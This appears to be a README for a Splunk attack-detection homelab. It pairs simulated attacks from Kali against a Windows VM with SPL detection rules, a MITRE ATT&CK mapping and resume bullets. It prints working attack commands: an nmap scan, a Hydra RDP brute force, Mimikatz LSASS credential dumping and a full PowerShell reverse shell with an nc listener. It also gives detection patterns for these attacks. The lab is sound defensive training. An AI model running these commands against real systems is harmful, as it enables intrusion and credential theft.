# Attack Detection Lab

A 3-VM SIEM homelab for detecting real-world attacks using Splunk Enterprise, Kali Linux, and Windows 10 on VirtualBox.

## Lab Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    VirtualBox Host                       │
│                                                         │
│  ┌──────────────┐   ┌──────────────┐   ┌─────────────┐ │
│  │  Kali Linux  │   │  Windows 10  │   │   Splunk    │ │
│  │  (Attacker)  │   │   (Victim)   │   │   Server    │ │
│  │              │──▶│              │──▶│  (Ubuntu)   │ │
│  │ 192.168.56.x │   │ 192.168.56.x │   │192.168.56.x │ │
│  └──────────────┘   └──────┬───────┘   └─────────────┘ │
│                            │ Splunk UF                  │
│                            │ port 9997                  │
│        Host-Only Network: 192.168.56.0/24               │
│        NAT Network: internet access per VM              │
└─────────────────────────────────────────────────────────┘
```

**VM Specs:**
| VM | OS | RAM | Role |
|---|---|---|---|
| Splunk Server | Ubuntu 25.04 | 6 GB | SIEM / Log aggregation |
| Windows 10 | Windows 10 22H2 | 4 GB | Victim / log source |
| Kali Linux | Kali 2026.1 | 4 GB | Attacker |

**Network:** Each VM has two adapters — NAT (internet) and Host-only (192.168.56.0/24, isolated lab traffic).

---

## Attack Simulations

All attacks were run from the Kali Linux VM targeting the Windows 10 VM.

### 1. Network Reconnaissance — Nmap (T1046)

```bash
nmap -sS -A -p- 192.168.56.<windows-ip>
```

Performs a SYN scan across all 65535 ports with OS/service detection. Generates inbound connection attempts visible in Windows firewall logs.

---

### 2. RDP Brute Force — Hydra (T1110)

```bash
gunzip /usr/share/wordlists/rockyou.txt.gz
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt \
  rdp://192.168.56.<windows-ip> -t 4
```

Attempts password spraying against the RDP service on port 3389. Each failed attempt generates **EventID 4625** in the Windows Security log.

---

### 3. Credential Dumping — Mimikatz (T1003)

Run on the **Windows VM** (simulating post-exploitation after gaining a foothold):

```powershell
# Run as Administrator in PowerShell
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

Dumps LSASS memory to extract plaintext credentials and NTLM hashes. Requires enabling process creation auditing to generate **EventID 4688**.

**Enable process auditing (run once on Windows VM):**
```powershell
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
```

---

### 4. Reverse Shell — PowerShell (T1059.001)

**Kali — open listener:**
```bash
nc -lvnp 4444
```

**Windows VM — initiate connection:**
```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.56.<kali-ip>", 4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
```

Establishes an outbound TCP connection from Windows to Kali, giving the attacker a remote shell. Generates **EventID 4688** with suspicious `powershell.exe` command line.

---

## Splunk Detection Rules (SPL)

All searches are saved as **Splunk Alerts** (real-time, threshold-based). Index: `main`.

### Rule 1 — RDP Brute Force Detection (T1110)

Triggers when a single source IP generates more than 10 failed logins within 5 minutes.

```spl
index=main EventCode=4625
| stats count by src_ip, TargetUserName
| where count > 10
| table src_ip, TargetUserName, count
| sort -count
```

**Alert config:** Real-time · Trigger when `count > 10` · Severity: High

---

### Rule 2 — Successful Login After Brute Force (T1110.001)

Detects a successful login from an IP that also had failed attempts — classic brute-force success pattern.

```spl
index=main (EventCode=4625 OR EventCode=4624)
| stats count(eval(EventCode=4625)) as failures,
        count(eval(EventCode=4624)) as successes
        by src_ip, TargetUserName
| where failures > 5 AND successes > 0
| table src_ip, TargetUserName, failures, successes
```

**Alert config:** Scheduled (every 5 min) · Severity: Critical

---

### Rule 3 — Mimikatz / Credential Dumping (T1003)

Detects process creation events containing Mimikatz-specific command strings.

```spl
index=main EventCode=4688
  (CommandLine="*sekurlsa*" OR CommandLine="*privilege::debug*"
   OR CommandLine="*mimikatz*" OR CommandLine="*lsadump*")
| table _time, host, User, ParentProcessName, CommandLine
```

**Alert config:** Real-time · Any result triggers · Severity: Critical

---

### Rule 4 — Reverse Shell via PowerShell (T1059.001)

Detects PowerShell spawning a TCP client — a common indicator of a reverse shell.

```spl
index=main EventCode=4688 Image="*powershell.exe*"
  (CommandLine="*TCPClient*" OR CommandLine="*Net.Sockets*"
   OR CommandLine="*StreamReader*")
| table _time, host, User, CommandLine, ParentProcessName
```

**Alert config:** Real-time · Any result triggers · Severity: Critical

---

## MITRE ATT&CK Mapping

| Attack | Tool | MITRE ID | Tactic | Splunk EventCode |
|---|---|---|---|---|
| Network scan | Nmap | T1046 | Discovery | Firewall/IDS logs |
| RDP brute force | Hydra | T1110 | Credential Access | 4625 (fail), 4624 (success) |
| Credential dumping | Mimikatz | T1003.001 | Credential Access | 4688 (process creation) |
| Reverse shell | PowerShell | T1059.001 | Execution | 4688 (process creation) |

---

## Splunk Dashboard

Dashboard name: **Attack Detection Lab**

| Panel | SPL Summary |
|---|---|
| Failed Logins Over Time | `EventCode=4625 \| timechart count by src_ip` |
| Top Targeted Accounts | `EventCode=4625 \| top TargetUserName` |
| Suspicious Processes | `EventCode=4688 \| table _time, host, CommandLine` |
| Active Alert Count | All 4 rules summarized by severity |

---

## Resume Bullets

> **Deployed 3-VM attack detection lab** (Splunk Enterprise, Kali Linux, Windows 10) on VirtualBox with isolated host-only networking; configured Splunk Universal Forwarder to ship Windows Security Event Logs in real time

> **Authored 4 Splunk correlation rules** detecting RDP brute force (EventCode 4625, T1110), credential dumping via Mimikatz (T1003), PowerShell reverse shell (T1059.001), and network reconnaissance (T1046); tuned thresholds to reduce false positives

> **Mapped all detections to MITRE ATT&CK** and built a live Splunk dashboard visualizing attack telemetry, failed login trends, and suspicious process execution

---

## Tools Used

- [Splunk Enterprise](https://www.splunk.com/) — SIEM and log analysis
- [Kali Linux](https://www.kali.org/) — Attacker OS (Nmap, Hydra, Netcat)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) — Credential dumping simulation
- [VirtualBox](https://www.virtualbox.org/) — Hypervisor
- [MITRE ATT&CK](https://attack.mitre.org/) — Threat intelligence framework
